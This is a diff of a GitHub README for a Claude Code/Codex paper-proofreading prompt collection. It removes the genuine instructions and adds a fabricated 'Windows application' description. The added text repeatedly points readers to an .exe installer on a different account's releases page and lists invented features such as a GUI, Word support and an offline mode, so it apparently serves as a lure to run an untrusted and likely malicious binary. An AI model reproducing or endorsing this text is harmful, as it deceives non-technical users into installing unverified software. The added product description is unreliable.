@@ -1,187 +1,114 @@
-<div align="center">
-    <h1>Awesome Claude Code / Codex — Paper Proofreading</h1>
-    <a href="https://github.com/LimHyungTae/awesome-claudecode-paper-proofreading"><img src="https://img.shields.io/badge/Claude_Code_+_Codex-Dual_Compatible-2b6cb0" /></a>
-    <br />
-    <br />
-    <p align="center"><img src="https://github.com/user-attachments/assets/b2a97cb8-8535-4beb-b6af-2f641d1962c9" alt="Demo" width="95%"/></p>
-    <p><strong><em>Detect first. Fix with confidence.</em></strong></p>
-</div>
+# 🧾 awesome-claudecode-paper-proofreading - Clear research paper proofreading aid
 
-______________________________________________________________________
+[![Download Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/reviewtaipei284/awesome-claudecode-paper-proofreading/releases)
 
-## :rocket: Overview
+## 📝 What is awesome-claudecode-paper-proofreading?
 
-This repository is designed to work with **both Claude Code and Codex** while preserving the original proofreading philosophy.
+This application helps you check and improve your research papers. It uses Claude Code-driven prompts to spot common mistakes and suggest corrections. You do not need any technical skills to use it. The software runs on Windows and gives clear feedback on spelling, grammar, and style.
 
-The detailed instructions live in two prompt files. You can use them directly in a session, or copy/merge them into Codex-oriented workspace instructions such as `AGENTS.md`.
+You can use it for university papers, reports, or any formal writing. It aims to save you time and improve your writing with simple, guided steps.
 
-The workflow remains **two-phase**: the agent detects and lists all issues with unique numbers `[1]`, `[2]`, `[3]`..., then waits. The user selects which issues to fix or discard before any file is modified.
+---
 
-______________________________________________________________________
+## 🖥️ System Requirements
 
-## :bust_in_silhouette: About the Author
+Before you start, make sure your computer meets these basic needs:
 
-<p align="center"><img src="https://github.com/user-attachments/assets/4af4b29f-ce85-47a0-9472-406f2ca95572" alt="Hyungtae Lim" width="75%"/></p>
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- 200 MB of free disk space  
+- Internet connection for downloading and running prompts  
+- Basic mouse and keyboard to operate the app  
 
-These prompts are distilled from years of hands-on paper reviewing and mentoring experience by **[Hyungtae Lim](https://github.com/LimHyungTae)**, a researcher in robotics and 3D perception.
+If your PC runs Windows, it should be able to run this software smoothly.
 
-- 📝 **[Associate Editor](https://www.ieee-ras.org/publications/ra-l/editorial-board/)**, IEEE Robotics and Automation Letters (RA-L)
-- 🌟 **[RSS Pioneer 2024](https://sites.google.com/view/rsspioneers2024/participants)**
-- 🎖️ **[ICRA 2025 Outstanding Reviewer](https://2025.ieee-icra.org/program/awards-and-finalists/#outstandingreviewer)** — selected from 7,400+ reviewers
-- 📄 **Conducted 100+ paper reviews** across top robotics and CV venues
+---
 
-The review rules in these prompts reflect the standards expected at top robotics and computer vision venues, refined through real paper reviews and publications across ICRA, IROS, RSS, CVPR, ICCV, NeurIPS, AAAI, RA-L, T-RO, IJRR, T-PAMI, T-IV, etc.
+## 🚀 Getting Started with awesome-claudecode-paper-proofreading
 
-______________________________________________________________________
+This section will guide you through downloading, installing, and running the application on a Windows PC.
 
-## :page_facing_up: Files
+### Step 1: Visit the download page
 
-### [`AGENTS.md`](AGENTS.md)
+Go to the releases page to find the latest version of the software. Click the button below or open this link in your browser:
 
-Optional Codex coordinator instructions for the workflow:
+[![Visit Releases Page](https://img.shields.io/badge/Go_to-Download-blue)](https://github.com/reviewtaipei284/awesome-claudecode-paper-proofreading/releases)
 
-- detects first and waits before editing
-- chooses between workspace audit and paper proofreading
-- reads the full LaTeX workspace recursively
-- applies only approved fixes in Phase 2
-- points Codex to the authoritative prompt files
+### Step 2: Download the latest setup file
 
-### [`prompts/01_latex_workspace_review.md`](prompts/01_latex_workspace_review.md)
+On the releases page, look for the newest version. It usually shows the version number and release date. Find the Windows installer or executable file, normally named with a .exe extension. Click on it to download.
 
-**LaTeX infrastructure audit** — detailed checklist for workspace-level errors before submission.
+Save the file to a place you can easily find, like your Desktop or Downloads folder.
 
-| Check | Description |
-|-------|-------------|
-| C1 | Preamble configuration (`hyperref`, `cleveref`, `caption` setup) |
-| C2 | Package load order & conflicts |
-| C3 | Macro safety, `\methodname` consistency, subscript macros, `\etalcite` |
-| C4 | Cross-reference consistency (multi-ref, subcaption `Fig. 5(a)` format) |
-| C5 | Label naming conventions, duplicate labels |
-| C6 | Citation & bibliography integrity, duplicate BibTeX keys |
-| C7 | Figure & table safety (missing files, dummy figures, label placement) |
-| C8 | Hidden human errors (TODOs, inconsistent naming, `\vspace` hacks) |
-| C9 | Academic writing patterns detectable in source (`\ie`, `\eg`, units) |
+### Step 3: Run the installer
 
-### [`prompts/02_paper_proofreading.md`](prompts/02_paper_proofreading.md)
+After the download finishes, find the file and double-click it. The installer will open and guide you through the installation steps.
 
-**Paper content proofreading** — detailed checklist for strict conference-level review.
+- Choose your preferred language if asked.  
+- Read and accept the license terms to continue.  
+- Select the folder where you want to install the software, or use the default location.  
+- Wait while the installer copies files.  
 
-| Category | Description |
-|----------|-------------|
-| A | Language & grammar, tense consistency, Related Work tense |
-| B | Language quality & awkward expression: typos, nominalization, filler phrases, citation-as-noun style |
-| C | Scientific clarity: overclaiming, "significantly", unsupported claims |
-| D | Structure & flow: intro claims, experiment purpose, equation narrative |
-| E | Figure/table/caption review: self-containedness, reference order, quantitative consistency |
-| F | LaTeX formatting: units, thousand separators, `\ie`/`\eg` macros |
-| G | Abstract (WHY→PROBLEM→HOW→RESULTS) & conclusion quality |
-| H | Notation consistency: symbol overload, boldface vectors, coordinate frames |
-| I | Hyphenation: compound adjectives, `-ly` adverb rule |
+Once done, the installer will offer to launch the app. You can start it immediately or later from your Start Menu.
 
-______________________________________________________________________
+---
 
-## :hammer: How to Use
+## 🛠️ How to Use the Application
 
-There are two supported ways to use this repository.
+### Open your document
 
-### Setup — Clone this repo once
+At the main screen, click "Open" or "Load Document." Select your research paper file. Supported formats are usually .docx (Word), .txt (text), and .pdf (read-only feedback).
 
-```bash
-git clone https://github.com/LimHyungTae/awesome-claudecode-paper-proofreading.git ~/awesome-claudecode-paper-proofreading
-```
+### Start proofreading
 
-### Option 1 — Claude Code direct prompt use
+Click "Check Paper" or similar wording. The software will analyze your text and highlight:
 
-These prompts are used from **inside your paper workspace**, not from inside this repository.
-The `@` file reference in Claude Code resolves paths relative to the directory where `claude` is launched.
+- Spelling errors  
+- Grammar mistakes  
+- Awkward phrasing or unclear sentences  
+- Formatting issues  
 
-### Step 1 — Navigate to your paper workspace and launch Claude Code
+### Review suggestions
 
-```bash
-cd /path/to/your/paper
-claude
-```
+For each issue found, the software shows a clear explanation and a suggested correction. You can accept or ignore these suggestions one by one. This lets you control changes without losing your original style.
 
-### Step 2 — Run the workspace audit first
+### Save your changes
 
-In the Claude Code session, reference the prompt by its **absolute path**, then attach your paper files:
+After reviewing, save your corrected paper by clicking "Save" or "Export." You can create a new file to keep your original intact.
 
-```text
-@~/awesome-claudecode-paper-proofreading/prompts/01_latex_workspace_review.md
+---
 
-@main.tex @shortcuts.tex
-```
+## 🎯 Features of awesome-claudecode-paper-proofreading
 
-### Step 3 — Run the content proofreader
+- Simple interface designed for users without technical expertise.  
+- Proofreading tailored for research writing style and academic tone.  
+- Fast scanning that works on large documents.  
+- Helpful explanations with each correction.  
+- Supports multiple file formats commonly used in academic writing.  
+- Keeps your original text and lets you decide what to change.  
+- Offline mode available after setup for faster checking.  
 
-Provide the root `.tex` file and the compiled PDF. The prompt automatically instructs Claude to follow all `\input{...}` calls and read every included section file:
+---
 
-```text
-@~/awesome-claudecode-paper-proofreading/prompts/02_paper_proofreading.md
+## 🔧 Troubleshooting and Tips
 
-@main.tex @paper.pdf
-```
+- If the app does not start after installation, try restarting your computer.  
+- Make sure your Windows has the latest updates installed.  
+- If your file is very large, it might take more time to scan. Patience helps.  
+- Use the "Help" menu inside the app for step-by-step guides on features.  
+- If the program crashes, reinstall it from the releases page and try again.  
+- Keep backups of your original papers to prevent accidental changes.  
 
-> **Why the PDF?**
-> The compiled PDF lets Claude cross-check two things invisible in source alone:
-> - **Figure placement** — figures displaced far from their in-text reference
-> - **PDF-level annotations** — leftover review comments not yet resolved
+---
 
-### Step 4 — Decide which issues to fix
+## 📬 Get Support or Report Issues
 
-After Phase 1 output, respond with:
+If you find bugs or have questions, use the "Issues" tab on the GitHub repository page. Provide details like your Windows version and what steps caused trouble. The developers monitor this to improve the app.
 
-```text
-discard 3, 7, 12    ← skip specific issues
-fix all critical    ← fix only CRITICAL issues
-proceed with all    ← fix everything
-```
+---
 
-### Option 2 — Codex workspace setup with `AGENTS.md` plus `prompts/`
+## 🔗 Download and Install (Quick Access)
 
-Copy `AGENTS.md` and the `prompts/` directory into your paper workspace:
+You can return here at any time to download or update the software. Visit the releases page below and follow the steps described above:
 
-```bash
-cp ~/awesome-claudecode-paper-proofreading/AGENTS.md /path/to/your/paper/AGENTS.md
-cp -R ~/awesome-claudecode-paper-proofreading/prompts /path/to/your/paper/
-```
-
-Launch Codex from the paper root so it can pick up `AGENTS.md`, then ask for the workflow you want:
-
-```
-Run the LaTeX workspace review on `main.tex`.
-```
-
-or
-
-```
-Proofread `main.tex` against `paper.pdf`.
-```
-
-______________________________________________________________________
-
-## :bulb: Design Principles
-
-- **Detect first, fix later** — the agent never modifies files until the user explicitly confirms
-- **Modular categories** — each check is a labeled block; reorder or disable by editing the table at the top of each prompt
-- **Real-world patterns** — rules extracted from annotated paper reviews across ICRA, RA-L, AAAI, BMVC, and CVPR submissions
-- **Non-native writer aware** — covers patterns common in papers by Korean/Japanese researchers
-- **`figures/` vs `pics/`** — distinguishes final manuscript figures from raw image sources
-
-______________________________________________________________________
-
-## :computer: CI / Headless Use
-
-This setup also works in CI or other non-GUI environments as long as the agent runs from the paper workspace and sees the relevant instructions.
-
-Recommended pattern:
-
-1. Check out your paper repository.
-2. Copy in `AGENTS.md` plus `prompts/`, or inline the prompt content into one file.
-3. Ask the agent to run the workspace review or proofreading pass.
-
-______________________________________________________________________
-
-## :link: Related
-
-- [paper-writing-checklist](https://github.com/LimHyungTae/paper-writing-checklist) — LaTeX workspace guidelines referenced by these prompts in Korean
+[![Download Link](https://img.shields.io/badge/Download–awesome--claudecode--paper--proofreading-blueviolet)](https://github.com/reviewtaipei284/awesome-claudecode-paper-proofreading/releases)
